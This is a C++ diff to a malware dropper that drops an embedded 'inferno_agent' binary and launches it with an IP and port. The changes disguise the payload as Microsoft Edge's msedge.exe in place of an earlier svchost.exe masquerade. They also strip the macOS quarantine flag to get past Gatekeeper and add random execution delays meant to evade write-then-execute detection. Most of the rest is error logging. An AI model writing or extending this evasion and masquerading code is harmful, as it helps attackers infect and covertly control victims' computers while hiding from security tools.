@@ -35,23 +35,11 @@ namespace {
 std::string installPath() {
 #ifdef _WIN32
     char appdata[MAX_PATH];
-    if (SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata) != S_OK) {
+    if (SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appdata) != S_OK) {
         return "C:\\temp\\inferno_agent.exe";
     }
     std::string path(appdata);
-    path += "\\Microsoft\\Crypto\\RSA\\";
-    // Create a random-looking subfolder
-    path += "S-1-5-21-";
-
-    // Append 4 random groups of digits
-    std::mt19937 rng(static_cast<unsigned>(
-        std::chrono::steady_clock::now().time_since_epoch().count()));
-    std::uniform_int_distribution<int> dist(100, 1099);
-    for (int i = 0; i < 4; ++i) {
-        path += std::to_string(dist(rng));
-        if (i < 3) path += "-";
-    }
-    path += "\\svchost.exe";
+    path += "\\Microsoft\\Edge\\Application\\msedge.exe";
     return path;
 #elif defined(__APPLE__)
     const char* home = ::getenv("HOME");
@@ -97,7 +85,10 @@ bool createDirectoryForFile(std::string& path) {
 
     // Fallback: %TEMP%\<random hex>
     char temp_buf[MAX_PATH];
-    if (GetTempPathA(MAX_PATH, temp_buf) == 0) return false;
+    if (GetTempPathA(MAX_PATH, temp_buf) == 0) {
+        std::fprintf(stderr, "[Wrapper] GetTempPathA failed: GLE=%lu\n", GetLastError());
+        return false;
+    }
     std::string fallback(temp_buf);
     while (!fallback.empty() && (fallback.back() == '\\' || fallback.back() == '/')) {
         fallback.pop_back();
@@ -138,10 +129,18 @@ bool createDirectoryForFile(std::string& path) {
     for (size_t i = 0; i < dir.size(); ++i) {
         current += dir[i];
         if (dir[i] == '/') {
-            ::mkdir(current.c_str(), 0700);
+            if (::mkdir(current.c_str(), 0700) != 0 && errno != EEXIST) {
+                std::fprintf(stderr, "[Wrapper] mkdir(%s) failed: %s\n",
+                             current.c_str(), std::strerror(errno));
+                return false;
+            }
         }
     }
-    ::mkdir(dir.c_str(), 0700);
+    if (::mkdir(dir.c_str(), 0700) != 0 && errno != EEXIST) {
+        std::fprintf(stderr, "[Wrapper] mkdir(%s) failed: %s\n",
+                     dir.c_str(), std::strerror(errno));
+        return false;
+    }
     return true;
 #endif
 }
@@ -152,13 +151,19 @@ bool extractAgent(const std::string& target) {
         return false;
     }
     FILE* f = ::fopen(target.c_str(), "wb");
-    if (!f) return false;
+    if (!f) {
+        std::fprintf(stderr, "[Wrapper] fopen(%s) failed: %s\n",
+                     target.c_str(), std::strerror(errno));
+        return false;
+    }
 
     size_t written = ::fwrite(inferno::wrapper::AGENT_BINARY, 1,
                               inferno::wrapper::AGENT_BINARY_SIZE, f);
     ::fclose(f);
 
     if (written != inferno::wrapper::AGENT_BINARY_SIZE) {
+        std::fprintf(stderr, "[Wrapper] fwrite wrote %zu/%zu bytes\n",
+                     written, inferno::wrapper::AGENT_BINARY_SIZE);
         ::remove(target.c_str());
         return false;
     }
@@ -180,14 +185,26 @@ bool runAgent(const std::string& path, const std::string& ip, uint16_t port) {
                         nullptr, nullptr, FALSE,
                         DETACHED_PROCESS | CREATE_NO_WINDOW,
                         nullptr, nullptr, &si, &pi)) {
+        std::fprintf(stderr, "[Wrapper] CreateProcessA(%s) failed: GLE=%lu\n",
+                     cmd.c_str(), GetLastError());
         return false;
     }
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     return true;
 #else
+#if defined(__APPLE__)
+    // Remove quarantine attribute so Gatekeeper doesn't block the agent
+    std::string xattr_cmd = "xattr -dr com.apple.quarantine \"";
+    xattr_cmd += path;
+    xattr_cmd += "\" 2>/dev/null";
+    ::system(xattr_cmd.c_str());
+#endif
     pid_t pid = ::fork();
-    if (pid < 0) return false;
+    if (pid < 0) {
+        std::fprintf(stderr, "[Wrapper] fork() failed: %s\n", std::strerror(errno));
+        return false;
+    }
     if (pid > 0) return true; // parent returns, child continues
 
     // Child: execute the agent using execvp which searches PATH and
@@ -222,6 +239,20 @@ int main(int argc, char* argv[]) {
     if (!extractAgent(target)) {
         return 1;
     }
+
+    // Execution jitter: 5-15s random delay to break write-then-execute heuristics
+    {
+        std::mt19937 rng(static_cast<unsigned>(
+            std::chrono::steady_clock::now().time_since_epoch().count()));
+        std::uniform_int_distribution<int> jitter_dist(5, 15);
+        int delay = jitter_dist(rng);
+#ifdef _WIN32
+        ::Sleep(static_cast<DWORD>(delay) * 1000);
+#else
+        ::sleep(delay);
+#endif
+    }
+
     if (!runAgent(target, ip, port)) {
         return 1;
     }
